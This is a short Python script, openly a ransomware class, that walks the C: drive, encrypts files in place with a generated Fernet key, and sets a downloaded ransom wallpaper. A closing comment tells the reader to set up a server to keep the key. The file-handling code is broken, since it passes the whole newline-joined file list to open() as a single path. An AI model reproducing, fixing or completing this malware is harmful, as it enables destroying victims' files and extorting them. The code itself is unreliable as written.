import os
import requests
import ctypes
from cryptography.fernet import Fernet
from threading import Thread

desktop = os.path.expanduser('~/Desktop')

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key() # Key
        self.token = Fernet(self.key)
        Thread(target=self.encrypt_files).start()
        Thread(target=self.wallpaper).start()

    def get_files(self):
        result = []
        for root, dir, files in os.walk('C:\\'):
            for file in files:
                result.append(os.path.join(root, file) + '\n')
        return ''.join(result)

    def encrypt_files(self) -> None:
        with open(self.get_files(), 'rb+') as f:
            plain_text = f.read()
            cipher_text = self.token.encrypt(plain_text)
            f.seek(0); f.truncate()
            f.write(cipher_text)

    def wallpaper(self) -> None:
        my_wallpaper = requests.get('YOUR WALLPAPER BACKGROUND')
        with open(os.path.join(desktop, 'wallpaper.jpg'), 'wb') as img:
            img.write(my_wallpaper.content)
        ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.join(desktop, 'wallpaper.jpg') , 0) 

Ransomware()
# Find a way to save the key, in order to decrypt the files. (Maybe setup a server, Its now your work.)
